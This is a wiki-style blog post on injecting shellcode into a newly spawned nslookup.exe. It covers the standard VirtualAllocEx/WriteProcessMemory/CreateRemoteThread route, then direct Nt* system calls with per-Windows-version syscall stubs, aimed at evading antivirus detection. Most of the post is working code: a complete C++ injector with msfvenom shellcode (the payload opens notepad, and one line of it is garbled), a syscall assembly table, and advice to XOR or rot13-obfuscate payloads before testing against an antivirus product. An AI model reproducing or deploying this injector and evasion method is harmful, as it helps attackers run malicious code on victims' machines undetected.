---
title: "Direct system call injection process to avoid anti-kill"
slug: "direct-system-call-injection-process-to-avoid-anti-kill"
priority: 7
editor: "wysiwyg"
revisionCount: 2
id: 57
createdAt: "2020-12-17T03:23:53Z"
createdBy: "boschko"
updatedAt: "2020-12-17T04:09:14Z"
updatedBy: "boschko"
ownedBy: "boschko"
views: 10
---
<p id="bkmrk-the-content-is-as-ti">The content is as titled.</p>
<p id="bkmrk-this-is-also-a-techn">This is also a technology I have used for a long time. I have also posted such on my github and given this to many others.</p>
<h4 id="bkmrk-introduction"><strong>Introduction </strong></h4>
<p id="bkmrk-the-main-idea-is-to-">The main idea is to inject shellcode into the process. The process can be an existing process or a newly created process.</p>
<p id="bkmrk-mainly-used-api-are%3A">Mainly used api are as listed below. Also a good resource for undocumented windows process injection stuff that I like is the following: <a href="https://bytepointer.com/resources/index.htm">https://bytepointer.com/resources/index.htm</a> </p>
<pre id="bkmrk-lpvoid-virtualalloce"><code class="language-C#">LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
); 

BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

HANDLE CreateRemoteThread(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);</code></pre>
<p id="bkmrk-the-simple-demo-is-a">The simple demo is as follows:</p>
<pre id="bkmrk-%23include-%3Ciostream%3E-"><code class="language-C++">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;
#include "common.h"

int main()
{// msfvenom -p windows/x64/exec CMD=notepad.exe -f cunsignedchar shellcode[] ="\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52""\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48""\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9""\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41""\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48""\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01""\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48""\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0""\ xac \ x41 \ xc1 \ xc9 \ x0d \ x41 \ x01 \ xc1 \ x38 \ xe0 \ x75 \ xf1 \ x4c \ x03 \ x4c "
        
        "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
        "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
        "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74"
        "\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

    // Create a 64-bit process: 
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPVOID allocation_start;
    SIZE_T allocation_size = sizeof(shellcode);
    LPCWSTR cmd;
    HANDLE hProcess, hThread;
    
    ZeroMemory(&amp;si, sizeof(si));
    ZeroMemory(&amp;pi, sizeof(pi));
    si.cb = sizeof(si);
    cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");

    if (!CreateProcess(
        cmd,							// Executable
        NULL,							// Command line
        NULL,							// Process handle not inheritable
        NULL,							// Thread handle not inheritable
        FALSE,							// Set handle inheritance to FALSE
        CREATE_NO_WINDOW,	            // Do Not Open a Window
        NULL,							// Use parent's environment block
        NULL,							// Use parent's starting directory 
        &amp;si,			                // Pointer to STARTUPINFO structure
        &amp;pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout &lt;&lt; "FAILED" &lt;&lt; errval &lt;&lt; std::endl;
    }
    WaitForSingleObject(pi.hProcess, 1000); // Allow nslookup 1 second to start/initialize. 

    // Inject into the 64-bit process:
    // HIGH-LEVEL WINDOWS API:
    allocation_start = VirtualAllocEx(pi.hProcess, NULL, allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, allocation_start, shellcode, allocation_size, NULL);
    CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocation_start, NULL, 0, 0);
}</code></pre>
<p id="bkmrk-then-analyze-the-api">Then analyze the API call situation:</p>
<p id="bkmrk-"><a href="/uploads/images/gallery/2020-12/XlCrYUUb5PpRZixP-image-1608175943806.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-12/scaled-1680-/XlCrYUUb5PpRZixP-image-1608175943806.png" alt="image-1608175943806.png"></a></p>
<p id="bkmrk--0"><a href="/uploads/images/gallery/2020-12/3lh3WpurC9kQpXtx-image-1608175994127.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-12/scaled-1680-/3lh3WpurC9kQpXtx-image-1608175994127.png" alt="image-1608175994127.png"></a></p>
<p id="bkmrk-it-is-important-to-r">it is important to remember that there are two types of APIs that can be spied on:</p>
<p id="bkmrk--1"><a href="/uploads/images/gallery/2020-12/CYbAoKxwhcLvvaxB-image-1608176018366.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-12/scaled-1680-/CYbAoKxwhcLvvaxB-image-1608176018366.png" alt="image-1608176018366.png"></a></p>
<p id="bkmrk-we-use-low-level-api">We use low level APIs for our operations</p>
<h4 id="bkmrk-so%2C">So,</h4>
<p id="bkmrk-first%2C-make-a-system">First, make a system call to the API you need to use. The core code is as follows:</p>
<pre id="bkmrk-ntallocatevirtualmem"><code class="language-C++">NtAllocateVirtualMemory(pi.hProcess, &amp;allocation_start, 0, (PULONG)&amp;allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
NtWriteVirtualMemory(pi.hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
NtCreateThreadEx(&amp;hThread, GENERIC_EXECUTE, NULL, pi.hProcess, allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);</code></pre>
<p id="bkmrk-among-them%2C-ntalloca">Among them, NtAllocateVirtualMemory needs to consider the version differences of different operating systems. Refer to the following:</p>
<pre id="bkmrk-ntallocatevirtualmem-0"><code class="language-C++">NtAllocateVirtualMemory_SystemCall_6_1_7600:          ; Windows 7 SP0
	mov eax, 0015h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_6_1_7601:          ; Windows 7 SP1 and Server 2008 R2 SP0
	mov eax, 0015h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_6_2_XXXX:          ; Windows 8 and Server 2012
	mov eax, 0016h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_6_3_XXXX:          ; Windows 8.1 and Server 2012 R2
	mov eax, 0017h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_10_0_10240:        ; Windows 10.0.10240 (1507)
	mov eax, 0018h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_10_0_10586:        ; Windows 10.0.10586 (1511)
	mov eax, 0018h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_10_0_14393:        ; Windows 10.0.14393 (1607)
	mov eax, 0018h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_10_0_15063:        ; Windows 10.0.15063 (1703)
	mov eax, 0018h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_10_0_16299:        ; Windows 10.0.16299 (1709)
	mov eax, 0018h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_10_0_17134:        ; Windows 10.0.17134 (1803)
	mov eax, 0018h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_10_0_17763:        ; Windows 10.0.17763 (1809)
	mov eax, 0018h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_10_0_18362:        ; Windows 10.0.18362 (1903)
	mov eax, 0018h
	jmp NtAllocateVirtualMemory_Epilogue
NtAllocateVirtualMemory_SystemCall_10_0_18363:        ; Windows 10.0.18363 (1909)
	mov eax, 0018h
	jmp NtAllocateVirtualMemory_Epilogue</code></pre>
<p id="bkmrk-the-list-is-as-follo">The list is as follows:</p>
<p id="bkmrk--2"><a href="/uploads/images/gallery/2020-12/FZgzFMJgddCvuntO-image-1608176233822.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-12/scaled-1680-/FZgzFMJgddCvuntO-image-1608176233822.png" alt="image-1608176233822.png"></a></p>
<p id="bkmrk-regarding-the-relati">Regarding the relationship, refer to the following figure then obfuscate your shellcode such as xor or rot13. Then load it into memory and decrypt it.</p>
<p id="bkmrk--3"><a href="/uploads/images/gallery/2020-12/exmxgou9ikPjzuIY-image-1608176311401.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-12/scaled-1680-/exmxgou9ikPjzuIY-image-1608176311401.png" alt="image-1608176311401.png"></a></p>
<p id="bkmrk-to-test-this-ill-use">To test this ill use the only antivirus that I respect qihoo 360  :not_troll:</p>
<p id="bkmrk--4"><a href="/uploads/images/gallery/2020-12/3VNT3OWkjdZhFmT9-image-1608176379913.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-12/scaled-1680-/3VNT3OWkjdZhFmT9-image-1608176379913.png" alt="image-1608176379913.png"></a></p>
<p id="bkmrk-%C2%A0"> </p>
<h4 id="bkmrk-by-boschko">By Boschko</h4>
<div id="bkmrk-my-hack-the-box%3A-htt">
<div>
<ul id="bkmrk-my-hack-the-box%3A-htt-0"><li class="graf graf--p">My Hack The Box: <a class="markup--anchor markup--p-anchor" href="https://www.hackthebox.eu/home/users/profile/37879" target="_blank" rel="nofollow noopener" data-href="https://www.hackthebox.eu/home/users/profile/37879">https://www.hackthebox.eu/home/users/profile/37879</a></li>
<li class="graf graf--p">My GitHub: <a class="markup--anchor markup--p-anchor" href="https://github.com/OlivierLaflamme" target="_blank" rel="noopener nofollow noopener" data-href="https://github.com/OlivierLaflamme">https://github.com/OlivierLaflamme</a></li>
<li class="graf graf--p">My WeChat QR below:</li>
</ul><figure id="bkmrk--15" class="graf graf--figure graf--layoutOutsetLeft"><img class="graf-image" src="https://cdn-images-1.medium.com/max/750/0*Jh0zrZrfyn8WjkDn.png" data-image-id="0*Jh0zrZrfyn8WjkDn.png" data-width="142" data-height="144"></figure></div>
</div>
